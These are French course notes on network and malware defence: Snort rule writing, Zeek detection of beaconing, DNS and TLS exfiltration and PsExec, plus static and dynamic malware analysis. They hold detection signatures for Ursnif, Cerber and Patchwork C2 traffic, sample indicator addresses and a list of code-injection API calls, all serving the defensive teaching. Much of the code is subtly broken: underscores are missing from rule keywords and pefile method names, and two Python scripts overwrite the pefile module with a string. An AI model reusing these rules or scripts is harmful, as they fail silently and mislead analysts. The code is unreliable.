sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq
Sources d’entrée de Snort
Analyse d’un fichier PCAP :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /chemin/vers/fichier.pcap
Surveillance en temps réel d’une interface réseau :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -i nominterface
Règles Snort

Les règles Snort sont composées d’un en-tête (définissant les critères) et d’options (actions et contenus spécifiques). Elles sont intégrées dans snort.lua, généralement dans la section ips :

ips = {
    { variables = default_variables, include = '/chemin/vers/fichier.rules' }
}
Chargement des règles en ligne de commande :
Fichier unique : -R /chemin/vers/fichier.rules
Répertoire contenant plusieurs règles : --rule-path /chemin/vers/dossier

Sorties de Snort

Snort peut générer plusieurs types de rapports :
Statistiques de base : Résume le nombre de paquets, les types d’activité, les fichiers traités, et les performances du système.
Alertes :
-A cmg : Affiche des alertes rapides avec en-têtes de paquets et payloads.
-A u2 : Format binaire Unified2, pour traitement post-analyse.
-A csv : Format CSV.
Statistiques de performance : Surveillent la mémoire, le CPU et les performances générales.

Pour lister les plugins de sortie disponibles :

snort --list-plugins | grep logger
Exemple avec sortie en format cmg :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /chemin/vers/fichier.pcap -A cmg
Fonctionnalités clés de Snort
Inspection approfondie des paquets (Deep Packet Inspection).
Détection d’intrusion en temps réel.
Surveillance de la sécurité réseau.
Prise en charge du trafic IPv4 et IPv6.
Détection d’anomalies et support multi-locataire.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Snort Rule Development</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8078-abe0-d0239902f236"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Règles Snort : Détection d'activités malveillantes

Une règle Snort est un outil puissant permettant d'identifier et de signaler des activités malveillantes potentielles dans le trafic réseau. Bien que les règles Snort ressemblent aux règles Suricata avec une structure composée d'un en-tête de règle et d'options, la documentation de Snort offre des conseils détaillés pour créer des règles efficaces.

Voici des exemples de règles pour détecter des malwares spécifiques. Vous pouvez utiliser ces règles en SSH sur le système cible pour reproduire et comprendre les commandes.

Exemple 1 : Détection d'Ursnif (de manière inefficace)

alert tcp any any -&gt; any any (msg:"Possible Ursnif C2 Activity"; flow:established,toserver; content:"/images/", depth 12; content:"2F"; content:"2B"; content:"User-Agent|3a 20|Mozilla/4.0 (compatible|3b| MSIE 8.0|3b| Windows NT"; content:!"Accept"; content:!"Cookie|3a|"; content:!"Referer|3a|"; sid:1000002; rev:1;)
Cette règle détecte le malware Ursnif en cherchant des motifs spécifiques dans le trafic HTTP :
flow:established,toserver; : correspond aux connexions TCP établies vers le serveur.
content:"/images/", depth 12; : cherche la chaîne /images/ dans les 12 premiers octets.
D'autres champs content correspondent à des motifs supplémentaires, comme "\2F", "\2B" et des en-têtes HTTP spécifiques.
! dans content:!"Accept"; indique l'absence de certains en-têtes HTTP.

Tester la règle sur le fichier ursnif.pcap :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/ursnif.pcap -A cmg
Exemple 2 : Détection de Cerber

alert udp $HOMENET any -&gt; $EXTERNALNET any (msg:"Possible Cerber Check-in"; dsize:9; content:"hi", depth 2, fastpattern; pcre:"/^[af0-9]{7}$/R"; detectionfilter:track bysrc, count 1, seconds 60; sid:2816763; rev:4;)
Cette règle cible le malware Cerber :
dsize:9; : restreint la règle aux datagrammes ayant une charge utile de 9 octets.
content:"hi", depth 2, fastpattern; : recherche "hi" dans les deux premiers octets.
pcre:"/^[af0-9]{7}$/R"; : utilise une expression régulière pour rechercher sept caractères hexadécimaux après "hi".
detectionfilter limite la fréquence des alertes par source.

Tester la règle sur le fichier cerber.pcap :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/cerber.pcap -A cmg
Exemple 3 : Détection de Patchwork

alert http $HOMENET any -&gt; $EXTERNALNET any (msg:"OISF TROJAN Targeted AutoIt FileStealer/Downloader CnC Beacon"; flow:established,toserver; httpmethod; content:"POST"; httpuri; content:".php?profile="; httpclientbody; content:"ddager=", depth 7; httpclientbody; content:"&amp;r1=", distance 0; httpheader; content:!"Accept"; httpheader; content:!"Referer|3a|"; sid:10000006; rev:1;)
Cette règle détecte le malware Patchwork APT en cherchant des motifs HTTP spécifiques :
flow:established,toserver; : spécifie les connexions sortantes.
httpmethod; content:"POST"; : recherche des requêtes HTTP POST.
httpclientbody et httpheader filtrent pour des contenus spécifiques et l'absence d'en-têtes.

Tester avec le fichier patchwork.pcap :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
Exemple 4 : Détection de Patchwork (SSL)

alert tcp $EXTERNALNET any -&gt; $HOMENET any (msg:"Patchwork SSL Cert Detected"; flow:established,fromserver; content:"|55 04 03|"; content:"|08|toigetgf", distance 1, within 9; classtype:trojan-activity; sid:10000008; rev:1;)
Cette règle SSL détecte le malware Patchwork en cherchant des motifs dans les certificats SSL :
content:"|55 04 03|"; : cible les champs de nom commun dans les certificats X.509 au format ASN.1.
distance et within affinent la recherche.

Exécuter avec le fichier patchwork.pcap :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
Résumé des Commandes et Tests
Tester une règle avec un fichier PCAP :
Exécution pour chaque fichier pcap spécifié (ursnif.pcap, cerber.pcap, etc.).
Option -A cmg permet de formater les alertes pour les afficher rapidement.

Chaque exemple de règle Snort se concentre sur des motifs spécifiques dans le trafic réseau pour identifier des comportements associés à des malwares comme Ursnif, Cerber, ou Patchwork. Ces règles peuvent être adaptées et optimisées selon les besoins de votre infrastructure de sécurité.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Zeek Fundamentals</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8055-9154-d3b73156326f"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Zeek est un analyseur de trafic réseau open-source largement utilisé pour identifier des activités réseau suspectes ou malveillantes. Il est également très efficace pour le dépannage réseau et la mesure des performances. Zeek génère des fichiers journaux qui fournissent des informations détaillées sur toutes les activités réseau, ce qui en fait un outil précieux pour les équipes de cybersécurité (blue teams). Ces journaux contiennent des enregistrements détaillés des connexions et des activités au niveau de la couche application, telles que les requêtes DNS, les sessions HTTP, etc. En outre, les fonctions de Zeek permettent une analyse approfondie et une détection qui vont au-delà de la simple journalisation.

L'une des caractéristiques les plus marquantes de Zeek est son langage de script puissant, qui permet aux utilisateurs de créer des scripts personnalisés similaires aux règles de Suricata. Ce langage permet aux équipes de sécurité de développer des stratégies d'analyse réseau et de détection d'intrusions sur mesure.
Caractéristiques de détection de Zeek

Plutôt que de se contenter d'une détection basée sur des signatures, Zeek propose une détection par abus sémantique, détection d'anomalies et analyse comportementale.

Modes de fonctionnement de Zeek

Zeek fonctionne dans plusieurs modes :
Analyse de trafic entièrement passive : Ne génère pas de trafic réseau mais observe et analyse le trafic existant.
Interface libpcap pour la capture de paquets : Utilise libpcap pour la capture de paquets réseau.
Analyse en temps réel et hors ligne : Peut être exécuté en mode en temps réel ou avec des fichiers PCAP pour une analyse hors ligne.
Support des clusters pour des déploiements à grande échelle : Zeek peut être déployé en mode cluster pour analyser de manière distribuée de grandes quantités de trafic réseau.

Architecture de Zeek

L'architecture de Zeek est composée de deux composants principaux :
Moteur d'événements (noyau) :
Transforme le flux de paquets entrants en une série d'événements de haut niveau qui décrivent l'activité réseau.
Ces événements sont neutres en termes de politique, ils décrivent ce qui s'est passé sans l'interpréter (par exemple, une requête HTTP est enregistrée comme un événement httprequest).
Interpréteur de script :
Exécute les gestionnaires d'événements écrits dans le langage de script de Zeek (scripts Zeek), qui spécifient les politiques de sécurité du site.
Les événements générés par le noyau de Zeek sont traités de manière séquentielle par les scripts.

Les événements de Zeek sont principalement définis dans les fichiers .bif situés dans /scripts/base/bif/plugins/. Pour une liste complète des événements, consultez la documentation des événements Zeek.

Journaux de Zeek

Lors de l'exécution de Zeek en mode hors ligne avec un fichier PCAP, les journaux sont enregistrés dans le répertoire actuel. Les journaux courants incluent :
conn.log : Détaille les connexions IP, TCP, UDP et ICMP.
dns.log : Enregistre les requêtes et réponses DNS.
http.log : Enregistre les détails des requêtes et réponses HTTP.
ftp.log : Enregistre les requêtes et réponses FTP.
smtp.log : Enregistre les transactions SMTP, y compris les détails de l'expéditeur et du destinataire.
Exemple de http.log :

Le fichier http.log contient des champs tels que host, uri, referrer, user\agent et status\_code.

Pour une liste complète des journaux et des champs de Zeek, consultez la documentation des journaux Zeek.

Zeek compresse les fichiers journaux toutes les heures en utilisant gzip et déplace les journaux plus anciens dans un répertoire nommé selon la date (format AAAA-MM-JJ). Pour gérer ces journaux compressés, utilisez des outils comme gzcat (pour afficher le contenu) et zgrep (pour rechercher dans les journaux).

Zeek fournit également zeek-cut, un utilitaire pour extraire des colonnes spécifiques des journaux de Zeek, facilitant ainsi l'analyse des journaux.

Fonctionnalités clés de Zeek

Les principales fonctionnalités qui renforcent l'efficacité de Zeek sont :
Journalisation détaillée des activités réseau : Capture une grande variété d'activités réseau, y compris les protocoles de la couche application (par exemple, HTTP, DNS, FTP, SMTP, SSH, SSL).
Inspection du contenu des fichiers échangés via des protocoles de la couche application.
Support d'IPv6 : Zeek prend en charge l'analyse du trafic IPv6.
Détection et analyse des tunnels : Identifie les tunnels réseau.
Vérifications de validité dans l'analyse des protocoles.
Correspondance de modèles similaire à un IDS : Détection basée sur des motifs de comportement suspects.
Langage de script puissant : Permet d'ajouter des analyses personnalisées et de gérer des états au sein des scripts.
Sortie des journaux en ASCII par défaut : Options pour intégrer avec des outils comme ElasticSearch et DataSeries.
Intégration en temps réel des entrées externes : Permet d'analyser des flux en temps réel.
Interface avec des bibliothèques C : Partage des événements Zeek avec d'autres programmes.
Capacité à déclencher des processus externes depuis le langage de script.

Pour aller plus loin avec Zeek

Pour des exemples de règles, des bases de scripting et des cas d'utilisation, consultez la documentation des exemples de Zeek. Si vous débutez, le guide de démarrage rapide de Zeek est une excellente ressource.

Zeek est un outil extrêmement flexible et puissant pour l'analyse du trafic réseau, la détection d'intrusions et le diagnostic des problèmes réseau, offrant des capacités bien au-delà de l'analyse classique basée sur des signatures.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Intrusion Detection With Zeek</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8000-9e78-fb365ae70cd1"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Exemples de détection d'intrusion
Exemple 1 : Détection de malware utilisant du beaconing

Le beaconing est un comportement répété utilisé par les malwares pour communiquer avec un serveur de commande et contrôle (C2). On peut détecter ce comportement en analysant les connexions dans le fichier conn.log, en repérant les connexions répétitives vers la même adresse IP, avec des tailles de données constantes ou des intervalles réguliers.

Commande :

/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psempire.pcap
cat conn.log
Analyse :
Le fichier conn.log montre des connexions régulières toutes les 5 secondes vers l’IP 51.15.197.127:80, typiques du malware PowerShell Empire.

Exemple 2 : Détection d’exfiltration de données via DNS

L’exfiltration via DNS imite le trafic normal, mais peut être détectée en analysant les fichiers files.log ou dns.log de Zeek à la recherche de transferts de données importants ou de canaux cachés. Le fichier dns.log peut révéler des domaines ou sous-domaines suspects.

Commande :

/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/dnsexfil.pcapng
cat dns.log | /usr/local/zeek/bin/zeek-cut query | cut -d . -f1-7
Analyse :
Des sous-domaines fréquents comme 456c54f2.blue.letsgohunt.online indiquent un possible tunneling DNS.

Exemple 3 : Détection d’exfiltration de données via TLS

L’exfiltration via TLS peut être identifiée en repérant de grands volumes de données envoyées entre certaines machines. On analyse conn.log en filtrant et en agrégeant les données pour détecter des tailles anormales.

Commande :

/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/tlsexfil.pcap
cat conn.log | /usr/local/zeek/bin/zeek-cut id.origh id.resph origbytes | \
sort | grep -v -e '^$' | grep -v '-' | datamash -g 1,2 sum 3 | sort -k 3 -rn | head -10
Analyse :
Cette commande révèle l’envoi d’environ 270 Mo de données à l’adresse 192.168.151.181.

Exemple 4 : Détection d’activité PsExec

PsExec est souvent utilisé pour l’administration à distance et dans les attaques. Quand il est utilisé via SMB, les fichiers smbfiles.log, dcerpc.log et smbmapping.log peuvent révéler son activité.

Commande :

/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psexecadduser.pcap
cat smbfiles.log
cat dcerpc.log
cat smb_mapping.log
Analyse :
Ces journaux montrent le transfert et l’exécution du fichier PSEXESVC.exe, ce qui correspond au comportement typique de PsExec.

Résumé des outils et commandes utilisés
zeek-cut : extrait des colonnes spécifiques des journaux Zeek.
sort : trie les données pour faciliter l’analyse.
grep : filtre les résultats.
datamash : permet d’agréger les données (somme, regroupement, etc.).

Ces outils permettent de mettre en évidence des schémas de comportement suspects dans les journaux réseau. Leur utilisation combinée avec Zeek ou Wireshark permet une analyse fine du trafic.</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction to Malware Analysis</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction To Malware &amp; Malware Analysis part1</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8029-baa0-e78551b6b9cd"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Introduction à l’Analyse de Malware

Ce module fournit les bases essentielles pour permettre aux analystes SOC de comprendre, détecter et analyser les malwares, en se concentrant principalement sur ceux conçus pour les systèmes Windows.

Types de Malware
Virus : Infectent des fichiers légitimes et se propagent en s’y attachant.
Worms (vers) : Se répliquent automatiquement via les réseaux, sans interaction humaine.
Trojans (chevaux de Troie) : Déguisés en logiciels fiables, ils permettent un accès non autorisé.
Ransomware : Chiffrent les données et exigent une rançon pour leur restitution.
Spyware : Espionnent l’utilisateur en collectant des données à son insu (mots de passe, historique, etc.).
Adware : Affichent des publicités invasives et peuvent suivre les activités en ligne.
Botnets : Réseaux d’ordinateurs compromis utilisés pour lancer des attaques ou propager d’autres malwares.
Rootkits : Prennent le contrôle de composants du système pour dissimuler des activités malveillantes.
Backdoors / RATs : Ouvrent un accès à distance permanent au système infecté.
Droppers : Installeurs furtifs utilisés pour déployer d'autres charges malveillantes.
Information Stealers : Conçus pour dérober des données sensibles (identifiants, informations personnelles, etc.).

Sources de Samples (Échantillons de Malware)

L’analyse de malware doit toujours s’effectuer dans un environnement isolé et sécurisé. Voici quelques plateformes fiables pour se procurer des échantillons :
VirusShare
Hybrid Analysis
TheZoo (GitHub)
Malware-Traffic-Analysis.net
VirusTotal
ANY.RUN
Contagio Malware Dump
VX Underground

Acquisition de Malware / Preuves Numériques

Lors d’une enquête, la capture du disque et de la mémoire vive est cruciale pour collecter des preuves.
Outils d’Imagerie Disque :
FTK Imager : Référence dans la création d’images forensiques.
OSFClone : Outil open source compatible avec divers systèmes de fichiers.
DD / DCFLDD : Utilitaires en ligne de commande très utilisés sous Linux pour la copie bit à bit.
Outils d’Acquisition de Mémoire Vive :
DumpIt : Simple d’utilisation pour les systèmes Windows/Linux.
MemDump : Utilitaire en ligne de commande pour la capture RAM.
Belkasoft RAM Capturer : Spécialisé dans la récupération mémoire même face à l’anti-debugging.
Magnet RAM Capture : Outil ergonomique de Magnet Forensics.
LiME (Linux Memory Extractor) : Parfait pour l’analyse de la mémoire volatile sous Linux.
Autres outils utiles :
KAPE : Pour la collecte ciblée d’artéfacts.
Velociraptor : Outil d’investigation basé sur une requête personnalisable (VQL).

Définition, Objectifs et Méthodes de l’Analyse de Malware

L’analyse de malware consiste à étudier un logiciel malveillant pour comprendre son fonctionnement, sa source, et son impact. Elle contribue à :
Renforcer les capacités de détection,
Mener du reverse engineering,
Collecter de l’intelligence sur les menaces.
Objectifs Principaux :
Détection et Classification : Identifier le type de malware et créer des règles de détection.
Reverse Engineering : Désassembler le code pour en comprendre la logique, les méthodes de chiffrement et les mécanismes de communication avec un C2.
Analyse Comportementale : Observer les actions du malware sur le système (fichiers créés, connexions, processus, etc.).
Renseignement sur la menace (Threat Intel) : Identifier les tactiques, techniques et infrastructures utilisées par les attaquants.

Techniques Courantes d’Analyse
Analyse Statique : Étude du fichier sans l’exécuter pour repérer des éléments clés (signatures, chaînes, imports).
Analyse Dynamique : Exécution du malware dans un environnement contrôlé pour observer son comportement.
Analyse de Code : Reverse engineering pour explorer en profondeur les fonctions et structures du malware.
Analyse Mémoire : Inspection de la RAM pour détecter du code injecté ou des comportements actifs.
Décompactage de Malware : Extraction du vrai code masqué par un packer ou un crypteur.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Windows Internals</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80ef-b037-fd7f24abd37e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Comprendre les Internes de Windows pour l’Analyse de Malware

La compréhension des mécanismes internes de Windows est essentielle pour analyser efficacement les malwares. Cela permet d’interpréter leur comportement, d’identifier leurs points d’ancrage dans le système, et de détecter leurs méthodes de persistance ou d’évasion.

Modes de Fonctionnement de Windows
Mode Utilisateur (User Mode)
  Accès restreint ; utilisé par les applications.
  → Le malware peut manipuler les fichiers, le registre ou chercher à élever ses privilèges.
Mode Noyau (Kernel Mode)
  Accès total au système et au matériel.
  → Les malwares en mode noyau peuvent modifier le comportement de Windows, intercepter des appels système et se cacher plus efficacement.

Architecture de Windows
Composants en Mode Utilisateur
Processus Système : ex. winlogon.exe, smss.exe, services.exe.
Services : tâches en arrière-plan comme Windows Update ou le Planificateur.
Applications Utilisateur : communiquent avec le noyau via les API (NTDLL.DLL).
Sous-systèmes d’environnement : ex. Win32, POSIX.
DLL de Sous-système : font le lien entre fonctions documentées et appels natifs (kernelbase.dll, user32.dll, etc.).
Composants en Mode Noyau
Executive : Gère I/O, processus, objets, sécurité.
Kernel : Planification des tâches, synchronisation.
Pilotes : Interface entre Windows et le matériel.
HAL (Hardware Abstraction Layer) : Abstraction du matériel.
Win32k.sys : Gère l’interface graphique.

Flux des Appels API Windows

Les malwares utilisent fréquemment les API Windows pour interagir avec le système.
Exemple d’appel : ReadProcessMemory
Flux d’exécution :
  kernel32.dll → ntdll.dll → NtReadVirtualMemory → Appel système au noyau.
SSDT (System Service Descriptor Table) :
  Gère la correspondance entre les appels système et les fonctions du noyau.

Format PE (Portable Executable)

Le format PE est utilisé pour les .exe, .dll, etc.
Comprendre sa structure est fondamental pour identifier du code malveillant.
Sections courantes :
.text : Code exécutable.
.data : Variables initialisées.
.rdata : Données constantes.
.pdata : Gestion des exceptions.
.bss : Données non initialisées.
.rsrc : Ressources (icônes, images).
.idata : Fonctions importées.
.edata : Fonctions exportées.
.reloc : Données de relocalisation.

 L’analyse de ces sections permet d’observer le comportement interne du malware, les fonctions appelées, et les ressources intégrées.

Processus Windows

Un processus est une instance d’un programme en exécution, avec ses propres ressources système :
PID : Identifiant unique.
Espace mémoire virtuel : Code, données, pile, etc.
Code exécutable : Instructions chargées depuis le disque.
Handles : Références vers fichiers, registres, etc.
Contexte de sécurité : Jeton définissant les droits.
Threads : Unités d'exécution parallèles au sein d’un processus.

 Suivre ces éléments aide à repérer les comportements suspects d’un malware.

Bibliothèques Dynamiques (DLL)

Les DLL contiennent des fonctions partagées utilisées à la fois par Windows et les malwares.
Fonctions Importées

Chargées dynamiquement pour interagir avec le système.

 Exemple d’injection de code :
OpenProcess
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
Fonctions Exportées

Exposées par une DLL pour être utilisées par d'autres processus.

 Exemple : Les exports de kernel32.dll visibles avec CFF Explorer ou x64dbg révèlent des appels système clés.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Static Analysis On Linux</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8062-8d99-c827c1692652"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse Statique de Malware

L’analyse statique consiste à examiner un fichier malveillant sans l’exécuter. Cette méthode permet de recueillir des informations essentielles sur l’échantillon, telles que son type, ses chaînes de caractères, ses empreintes (hashes), les éléments intégrés, et les signes de compression ou d’obfuscation. Elle constitue une étape fondamentale avant l’analyse dynamique ou le reverse engineering.

Éléments Clés de l’Analyse Statique
Type de fichier : Permet de vérifier la vraie nature du fichier, indépendamment de son extension.
Empreintes (hashes) : Un identifiant unique permettant de tracer ou comparer un échantillon.
Chaînes de caractères (strings) : Donnent des indices sur le comportement ou les cibles du malware.
Éléments intégrés : Domaines, chemins système, noms de fichiers, etc.
Présence d’un packer : Les packers compriment ou chiffrent les malwares pour masquer leur contenu.
Fonctions importées/exportées : Révèlent les API Windows utilisées.
Code assembleur : Fournit une vision bas niveau sur le fonctionnement du binaire.

Identification du Type de Fichier

Pour déterminer le type réel du fichier :

file /chemin/vers/malware.exe
Exemple de résultat :

PE32 executable (GUI) Intel 80386, for MS Windows
Vérification du header :

hexdump -C /chemin/vers/malware.exe | more
Cherchez la signature "MZ" (hexadécimal 4D 5A) pour confirmer un exécutable Windows.

Empreintes et "Fingerprinting"
Hashs de fichiers

Pour générer un identifiant unique du fichier :

md5sum /chemin/vers/malware.exe
sha256sum /chemin/vers/malware.exe
Utilisez ces valeurs sur des bases comme [VirusTotal](https://virustotal.com) pour croiser les informations.
Empreinte des Imports (IMPHASH)

L’IMPHASH identifie des malwares similaires en se basant sur leurs fonctions importées.

Exemple en Python :

import sys
import pefile

pe = pefile.PE(sys.argv[1])
print(pe.getimphash())
Exécution :

python3 imphashcalc.py /chemin/vers/malware.exe
Fuzzy Hashing avec SSDEEP

Pour mesurer la similarité entre fichiers :

ssdeep /chemin/vers/malware.exe
Hash des Sections PE

Analyser séparément chaque section (.text, .data, etc.) permet de détecter des modifications mineures.

Exemple Python :

import sys
import pefile

pe = pefile.PE(sys.argv[1])
for section in pe.sections:
    print(section.Name, "MD5 :", section.gethashmd5())
    print(section.Name, "SHA256 :", section.gethashsha256())
Exécution :

python3 sectionhashing.py /chemin/vers/malware.exe
Analyse de Chaînes de Caractères

Les chaînes ASCII/Unicode extraites peuvent contenir :
Noms de fichiers
IP, domaines
Fonctions API
Clés de registre

Commande pour extraire les chaînes longues :

strings -n 15 /chemin/vers/malware.exe
Pour détecter des chaînes obfusquées :

floss /chemin/vers/malware.exe
Détection et Décompression de Malware Packé (UPX)

Les malwares packés masquent leur code. Le mot-clé "UPX" dans les chaînes peut indiquer l'utilisation de ce packer.
Décompresser un exécutable UPX :

upx -d -o /chemin/vers/unpackedmalware.exe /chemin/vers/malware.exe
Puis relancez l’analyse :

strings /chemin/vers/unpacked_malware.exe</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Static Analysis On Windows</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80eb-af1e-ff59e6ce6d16"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse Statique de Malware sur Windows

L’analyse statique sous Windows suit les mêmes principes que sous Linux, mais utilise des outils spécifiques à l’environnement Windows pour examiner les fichiers malveillants sans les exécuter. Cette méthode permet d’identifier des éléments clés comme le type de fichier, les empreintes (hashes), les chaînes de caractères et d’éventuelles traces d’obfuscation ou de compression.

Éléments Clés de l’Analyse Statique sous Windows
Identification du type de fichier : Vérifie qu’il s’agit bien d’un exécutable Windows (fichier PE).
Hashing : Génération de hash MD5/SHA256 pour suivre et comparer les échantillons.
IMPHASH : Hachage basé sur les fonctions importées, utile pour détecter des variantes.
Fuzzy Hashing (SSDEEP) : Compare la similarité entre différents fichiers.
Hash des sections : Permet de repérer des altérations dans les sections PE.
Analyse de chaînes de caractères : Permet d’identifier des éléments utiles comme des IP, chemins système ou appels API.
Dépackaging : Permet d’extraire le contenu réel d’un malware packé avec UPX.

Vérification du Type de Fichier

Utilise CFF Explorer (C:\Tools\Explorer Suite) pour analyser la structure du fichier. Vérifie la présence de la signature ASCII "MZ" dans l’en-tête pour confirmer qu’il s’agit d’un exécutable Windows.

Empreintes et "Fingerprinting"
Génération de Hashs avec PowerShell

Get-FileHash -Algorithm MD5 C:\Samples\MalwareAnalysis\malware.exe
Get-FileHash -Algorithm SHA256 C:\Samples\MalwareAnalysis\malware.exe
Calcul de l’IMPHASH

Script Python avec le module pefile :

import sys
import pefile

pefile = sys.argv[1]
pe = pefile.PE(pefile)
print(pe.getimphash())
Exécution :

python imphashcalc.py C:\Samples\MalwareAnalysis\malware.exe
Fuzzy Hashing avec SSDEEP

C:\Tools\ssdeep-2.14.1\ssdeep.exe C:\Samples\MalwareAnalysis\malware.exe
Hash des Sections PE (Python)

Script d’exemple :

import sys
import pefile

pefile = sys.argv[1]
pe = pefile.PE(pefile)
for section in pe.sections:
    print(section.Name, "MD5 hash:", section.gethashmd5())
    print(section.Name, "SHA256 hash:", section.gethashsha256())
Outil graphique alternatif : PEStudio
(C:\Tools\pestudio\pestudio)

Analyse de Chaînes de Caractères
Extraction des chaînes :

C:\Sysinternals\strings.exe C:\Samples\MalwareAnalysis\malware.exe
Pour les chaînes obfusquées :

C:\FLOSS\floss.exe C:\Samples\MalwareAnalysis\malware.exe
Décompression de Malware Packé avec UPX

Rechercher la présence de "UPX" dans les chaînes extraites est un bon indicateur d’un fichier packé.
Décompression :

C:\Tools\upx\upx-4.0.2-win64\upx.exe -d -o unpackedmalware.exe C:\Samples\MalwareAnalysis\packed\malware.exe
Puis relancer l’analyse :

C:\Sysinternals\strings.exe unpackedmalware.exe</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Dynamic Analysis</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80b5-af99-fd2c8f859ec9"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse Dynamique des Malwares

L’analyse dynamique consiste à observer le comportement d’un malware en l’exécutant dans un environnement contrôlé. Contrairement à l’analyse statique, qui examine le fichier sans l’exécuter, cette méthode permet de voir en temps réel les modifications apportées au système.

Étapes Clés de l’Analyse Dynamique
Mise en Place de l’Environnement

Créez une machine virtuelle isolée pour exécuter le malware sans risque pour le reste du réseau. Il est essentiel de simuler un environnement réaliste : applications courantes, données utilisateur, configuration réseau fonctionnelle.
Capture de l’État Initial

Avant d’exécuter le malware, prenez un instantané du système : état des fichiers, registre Windows, processus actifs, configurations réseau. Cette base servira à comparer les changements provoqués par l’exécution du malware.
Déploiement des Outils (Pré-Exécution)

Installez et configurez des outils de surveillance comme :
ProcMon (Sysinternals) : journalisation des accès fichiers, modifications du registre, création de processus, etc.
Wireshark / tcpdump : capture du trafic réseau.
Regshot : comparaison de l’état du registre avant/après.
INetSim, FakeDNS, FakeNet-NG : émulation de services réseau pour interagir avec le malware.
Exécution du Malware

Lancez le malware avec les outils de surveillance actifs. Laissez-le s’exécuter assez longtemps pour observer ses actions, sans intervenir.
Observation et Journalisation

Surveillez :
La création de processus,
Les modifications de fichiers et du registre,
Les communications réseau.
Analyse Post-Exécution

Une fois le malware arrêté :
Comparez l’état du système avec le snapshot initial.
Recherchez les anomalies : fichiers créés, clés registre modifiées, processus suspects, connexions externes.

Analyse Dynamique avec Noriben

Noriben est un script Python qui automatise l’utilisation de ProcMon en filtrant les données inutiles pour mettre en évidence les comportements suspects.
Étapes d’Utilisation de Noriben
Lancer Noriben :

   cd C:\Tools\Noriben-master
   python Noriben.py
   Démarrage de ProcMon : Noriben lance ProcMon avec des filtres prédéfinis.
Exécution du Malware :
   Exécutez par exemple shell.exe dans C:\Samples\MalwareAnalysis.
Arrêter l’Enregistrement :
   Dans le terminal Noriben, utilisez Ctrl+C pour stopper la capture.
Analyser le Rapport :
   Noriben génère un fichier .txt contenant un résumé des actions suspectes classées par type (fichiers, registre, processus, réseau).

Analyse Fine avec ProcMon Directement

Si Noriben filtre trop d’informations, il peut être utile d’utiliser ProcMon manuellement :
Étapes :
Ouvrir ProcMon :
   Depuis C:\Tools\sysinternals.
Configurer les Filtres :
Ctrl+L pour accéder aux filtres.
Exemple : Process Name is shell.exe.
Exécuter le Malware :
   Lancez de nouveau le malware pour enregistrer ses activités.
Analyser les Comportements de Détection :
   Certains malwares peuvent interroger des clés de registre liées à VMware (ex : SOFTWARE\VMware, Inc.) pour détecter une sandbox.

Outils Complémentaires pour l’Analyse Dynamique
Sandboxes automatisées :
Cuckoo Sandbox,
Joe Sandbox,
FireEye DTI Cloud, etc.

 Certains malwares avancés détectent ces environnements et modifient leur comportement pour éviter la détection.

Exemples de Commandes
Lancer Noriben :

  python Noriben.py
  Utiliser ProcMon :
Lancer ProcMon.
Ctrl+L → Ajouter un filtre : Process Name is shell.exe.
